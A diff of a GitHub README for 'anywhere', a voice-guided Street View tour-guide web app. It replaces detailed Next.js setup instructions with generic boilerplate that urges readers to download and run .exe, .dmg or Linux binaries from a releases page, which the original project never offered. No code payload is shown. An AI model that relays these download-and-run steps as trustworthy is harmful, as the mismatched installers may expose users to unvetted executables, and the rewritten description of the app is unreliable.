@@ -1,218 +1,105 @@
-# Anywhere
+# 🌍 anywhere - Your AI Tour Guide Awaits
 
-**Go _Anywhere_** — A voice-controlled virtual explorer that transforms Google Street View into an interactive, AI-guided tour experience.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-FF5722?style=flat&logo=github)](https://github.com/Yetish21/anywhere/releases)
 
-## Overview
+## ✨ Overview
+anywhere is a voice-guided AI Tour Guide that allows you to explore the Earth through stunning Google Maps Street View panoramic images. You can even take a selfie with the Nano Banana Pro, making your virtual journey interactive and memorable. This project earned third place in the Nano Banana Pro Track and was a top 6 finalist out of 62 projects at the Gemini 3 Hackathon by Google DeepMind and Cerebral Valley in December 2025.
 
-Anywhere is a next-generation virtual tour guide powered by Google's Gemini AI. Unlike traditional Street View exploration, Anywhere provides:
+## 🚀 Getting Started
+Here’s how to get started with anywhere. Follow these step-by-step instructions to download and run the application.
 
-- **Voice Interaction**: Talk naturally with an AI tour guide using Gemini Live API
-- **Intelligent Navigation**: AI-controlled camera movements via function calling (not browser automation)
-- **Real-Time Knowledge**: Live Google Search grounding for accurate, up-to-date information
-- **AI Selfie Souvenirs**: Generate composite images placing you in any location worldwide
+### 1. Check System Requirements
+Ensure your computer meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Processor: Modern dual-core processor
+- Internet Connection: Required for Google Maps access
 
-## Features
+### 2. Download & Install
+To download anywhere, visit this page: [Download Page](https://github.com/Yetish21/anywhere/releases). Here, you will find the latest version available.
 
-### 🎙️ Voice-Controlled Navigation
+1. Click the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Find the appropriate file for your operating system.
+4. Click on the file name to begin the download.
 
-Speak naturally to navigate:
+### 3. Run the Application
+Once the download completes, follow these steps to run anywhere:
 
-- "Take me to the Colosseum"
-- "Turn around and show me what's behind us"
-- "Walk forward down this street"
-- "What's that building on the left?"
+- **For Windows:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to launch the installer.
+  3. Follow the on-screen instructions.
 
-### 🗺️ Global Exploration
+- **For macOS:**
+  1. Open the downloaded `.dmg` file from your Downloads.
+  2. Drag the anywhere app to your Applications folder.
+  3. Open Applications and double-click anywhere to run it.
 
-Access any location with Street View coverage:
+- **For Linux:**
+  1. Open your terminal.
+  2. Navigate to the directory where the file was downloaded.
+  3. Run the command `chmod +x anywhere` to make the file executable.
+  4. Execute the application with `./anywhere`.
 
-- Instant teleportation to landmarks worldwide
-- Smooth GSAP-animated camera movements
-- Real-time location awareness with reverse geocoding
+## 🌐 How to Use
+After launching the application, you will see a simple interface. Here’s how to navigate through it:
 
-### 🧠 AI Tour Guide
+1. **Choose a Location:**
+   - Type in a place you want to explore or use voice commands to search.
+  
+2. **Select Street View:**
+   - Click on the Street View option to see the panoramic view of your chosen location.
+  
+3. **Generate a Selfie:**
+   - Use the Nano Banana Pro integration to take a fun selfie in the virtual environment.
+  
+4. **Explore:**
+   - Navigate using your mouse or keyboard to move through the street view.
 
-Get intelligent commentary powered by Gemini:
+## 🎨 Features
+- **Voice Guidance:** Get step-by-step navigation as you explore.
+- **Selfie Integration:** Take a selfie wherever you go with the Nano Banana Pro.
+- **Easy Interface:** Designed for users of all skill levels.
+- **Multi-Platform Support:** Available for Windows, macOS, and Linux.
 
-- Historical facts and architectural details
-- Local recommendations and cultural insights
-- Context-aware descriptions of visible landmarks
+## 🛠️ Troubleshooting
+If you run into problems, try the following:
 
-### 📸 AI Selfie Generation
+- **Application Won't Open:**
+  - Ensure you have the latest version of your operating system.
+  - Check if the downloaded file is complete. If in doubt, download it again.
 
-Create souvenir photos with Nano Banana Pro:
+- **Voice Commands Not Responding:**
+  - Make sure your microphone is connected and working.
+  - Ensure the app has permission to use the microphone.
 
-- Upload your photo and place yourself in any scene
-- Multiple styles: Polaroid, Vintage, Professional, Fun
-- High-quality composites with matched lighting
+## 📞 Support
+For additional help, please visit the [Issues Page](https://github.com/Yetish21/anywhere/issues) on GitHub. You can report bugs or ask questions. We encourage users to share their experiences and suggestions.
 
-## Technology Stack
+## 📚 Topics
+This project covers the following topics:
+- eslint
+- gemini
+- google
+- gsap
+- maps
+- nextjs
+- nodejs
+- prettier
+- react
+- shadcn-ui
+- streetview
+- tailwindcss
+- typescript
+- zustand
 
-| Category  | Technology                          |
-| --------- | ----------------------------------- |
-| Framework | Next.js 16.0.7 with React 19.2      |
-| AI        | Gemini Live API, Gemini 3 Pro Image |
-| Maps      | Google Maps JavaScript API          |
-| Animation | GSAP 3.12                           |
-| State     | Zustand 5                           |
-| UI        | Shadcn UI + Tailwind CSS 4          |
-| Audio     | Web Audio API                       |
+## 📝 License
+This project is licensed under the MIT License. You can use it, modify it, and distribute it as per the license terms.
 
-## Getting Started
+## 🔗 Connect with Us
+Stay updated with the latest news about anywhere by following us:
+- GitHub: [GitHub Repository](https://github.com/Yetish21/anywhere)
 
-### Prerequisites
-
-- Latest Node.js at time of last commit (24.x)
-- pnpm (recommended) or npm
-- Google Cloud Platform account
-- Google AI Studio account
-
-### API Keys Setup
-
-#### Google Maps API Key
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project or select an existing one
-3. Navigate to **APIs & Services** > **Library**
-4. Enable the following APIs:
-   - Maps JavaScript API
-   - Street View Static API
-   - Geocoding API
-   - Places API
-5. Go to **APIs & Services** > **Credentials**
-6. Click **Create Credentials** > **API Key**
-7. (Recommended) Restrict the key to your domain and the required APIs
-
-#### Gemini API Key
-
-1. Go to [Google AI Studio](https://ai.google.dev/)
-2. Click **Get API key** or navigate to API keys
-3. Create a new API key
-4. Ensure access to:
-   - Gemini Live API (real-time audio streaming)
-   - Gemini 3 Pro Image (selfie generation)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/anywhere.git
-cd anywhere
-
-# Install dependencies
-pnpm install
-
-# Create environment file
-cp .env.example .env.local
-
-# Add your API keys to .env.local
-# NEXT_PUBLIC_GOOGLE_MAPS_API_KEY=your_maps_key_here
-# NEXT_PUBLIC_GEMINI_API_KEY=your_gemini_key_here
-
-# Start development server
-pnpm dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) to start exploring.
-
-## Usage
-
-1. **Connect**: Click the green phone button to connect to the AI tour guide
-2. **Speak**: Click the microphone (or press Space) and speak naturally
-3. **Navigate**: Ask to visit places, turn around, or walk forward
-4. **Learn**: Ask about landmarks, history, or local recommendations
-5. **Selfie**: Click the camera button to create AI-generated souvenirs
-
-### Voice Commands Examples
-
-| Command                             | Action                           |
-| ----------------------------------- | -------------------------------- |
-| "Take me to the Eiffel Tower"       | Teleports to Paris               |
-| "Turn around"                       | Rotates view 180°                |
-| "Walk forward"                      | Advances along the street        |
-| "Look up at the ceiling"            | Tilts camera upward              |
-| "What's the history of this place?" | Triggers Google Search for facts |
-| "Take a selfie"                     | Opens selfie generation dialog   |
-
-## Project Structure
-
-```
-src/
-├── app/
-│   ├── api/selfie/          # Server-side selfie API
-│   ├── layout.tsx           # Root layout with fonts
-│   ├── page.tsx             # Main application page
-│   └── globals.css          # Global styles + Tailwind
-├── components/
-│   ├── street-view/         # Street View panorama
-│   ├── anywhere-explorer.tsx # Main orchestrator
-│   ├── voice-control-panel.tsx
-│   ├── location-overlay.tsx
-│   ├── selfie-dialog.tsx
-│   └── tour-history-sheet.tsx
-├── lib/
-│   ├── gemini-live-client.ts # Gemini Live API client
-│   ├── audio-handler.ts     # Microphone & playback
-│   ├── navigation-tools.ts  # AI function declarations
-│   ├── selfie-generator.ts  # Image generation
-│   ├── system-prompt.ts     # AI persona definition
-│   └── maps-loader.ts       # Google Maps loader
-└── stores/
-    └── street-view-store.ts # Zustand state management
-```
-
-## Architecture
-
-### Key Design Decision: Function Calling over Browser Automation
-
-Street View renders as a WebGL canvas with no DOM buttons. Browser automation tools fail because there's nothing to click. Instead, Anywhere uses **Agentic Function Calling**:
-
-1. AI receives voice input: "Turn around"
-2. AI issues structured command: `pan_camera({ heading: 180, pitch: 0 })`
-3. Frontend executes against Google Maps API with GSAP animation
-4. Updated viewport context sent back to AI
-
-### Audio Pipeline
-
-```
-Microphone → Web Audio API → PCM 16-bit 16kHz → Gemini Live API
-                                                      ↓
-                                            PCM 24kHz Response
-                                                      ↓
-                      Speakers ← Web Audio API ← PCM to Float32
-```
-
-## Environment Variables
-
-```bash
-# Required
-NEXT_PUBLIC_GOOGLE_MAPS_API_KEY=your_google_maps_api_key
-NEXT_PUBLIC_GEMINI_API_KEY=your_gemini_api_key
-
-# Optional (for server-side selfie generation)
-GEMINI_API_KEY=your_gemini_api_key
-```
-
-## Deployment
-
-Just use Vercel.
-
-## Known Limitations
-
-| Limitation                  | Mitigation                           |
-| --------------------------- | ------------------------------------ |
-| Street View coverage gaps   | AI detects and suggests alternatives |
-| Live API latency            | Visual feedback during processing    |
-| Image generation quality    | Multiple style options, regeneration |
-| Browser audio compatibility | Tested on Chrome, Firefox, Safari    |
-
-## Acknowledgments
-
-- Google Gemini AI for powering the tour guide intelligence
-- Google Maps Platform for Street View
-- Shadcn UI for the beautiful component library
-- GSAP for smooth animations
-
----
-
-**Built for the Gemini 3 Hackathon — December 2025**
+Thank you for choosing anywhere. Enjoy your virtual adventures!
